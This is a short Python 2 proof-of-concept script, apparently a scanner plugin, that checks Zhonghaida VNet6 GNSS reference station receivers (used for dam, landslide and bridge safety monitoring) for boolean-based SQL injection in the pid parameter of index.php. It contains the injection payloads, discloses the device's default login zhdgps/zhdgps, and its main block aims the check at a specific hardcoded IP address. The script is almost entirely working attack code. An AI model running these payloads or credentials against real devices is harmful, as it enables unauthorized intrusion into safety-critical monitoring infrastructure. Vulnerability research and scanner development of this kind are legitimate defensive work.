#!/usr/bin/env python
# -*- coding: utf-8 -*-
import urlparse
import re

"""


该产品是用于：滑坡监测，尾矿库安全监测，水库大坝安全监测，桥梁健康监测，沉降塌陷监测，建筑监测，机械精密控制，精准农业导航，和精密定位的GNSS接收机。

POC Name  : 中海达VNet6专业型参考站接收机 SQL注入
Author    :  a
mail      :  a@lcx.cc

使用默认的账号密码(zhdgps/zhdgps)

"""

def assign(service, arg):
    if service == 'zhonghaida_vnet':
        arr = urlparse.urlparse(arg)
        return True, '%s://%s/' % (arr.scheme, arr.netloc)

def audit(arg):
    
    payload1 = 'index.php?lang=en&pid=200%20and%201011-1010=1' #1011-1010 运算
    payload2 = 'index.php?lang=en&pid=200%20and%201011-1010=2'
  
    url1 = arg +  payload1
    url2 = arg +  payload2
  
    code1, head,res1, errcode, _ = curl.curl2(url1)
    code2, head,res2, errcode, _ = curl.curl2(url2)
  
    if (code1 ==200) and res1 not in res2 :
        security_hole(url1 + ' SQL injection')

if __name__ == '__main__':
    from dummy import *
    audit(assign('zhonghaida_vnet', 'http://222.32.91.55/')[1])